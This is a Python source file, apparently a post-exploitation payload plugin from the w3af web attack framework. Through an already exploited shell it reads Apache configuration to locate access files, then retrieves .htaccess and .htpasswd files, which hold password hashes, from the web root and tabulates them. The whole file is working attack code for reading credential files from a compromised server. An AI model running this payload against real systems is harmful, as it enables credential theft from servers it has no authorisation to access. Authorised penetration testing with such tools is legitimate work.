import re
from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class apache_htaccess(Payload):
    """
    This payload shows Apache distributed configuration files (.htaccess & .htpasswd)
    """
    def api_read(self):
        result = {}
        result['htaccess_files'] = {}

        def parse_htaccess(config_file):
            htaccess = re.search('(?<=AccessFileName )(.*)', config_file)
            if htaccess:
                return htaccess.group(1)
            else:
                return ''

        apache_config_dict = self.exec_payload('apache_config_files')
        apache_config = apache_config_dict['apache_config'].values()
        htaccess = '.htaccess'
        if apache_config:
            for file in apache_config:
                for line in file:
                    if parse_htaccess(line):
                        htaccess = parse_htaccess(line)

        apache_root = self.exec_payload(
            'apache_root_directory')['apache_root_directory']
        if apache_root:
            for dir in apache_root:
                htaccess_content = self.shell.read(dir + htaccess)
                if htaccess_content:
                    result['htaccess_files'][dir +
                                             htaccess] = htaccess_content

                htpasswd_content = self.shell.read(dir + '.htpasswd')
                if htpasswd_content:
                    result['htaccess_files'][dir +
                                             '.htpasswd'] = htpasswd_content

        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result['htaccess_files']:
            return 'Apache htaccess files not found.'
        else:
            rows = []
            rows.append(['Apache htaccess files'])
            rows.append([])
            for key_name in api_result:
                for filename, file_content in api_result[key_name].items():
                    rows.append([filename, ])
            result_table = table(rows)
            result_table.draw(80)
            return rows
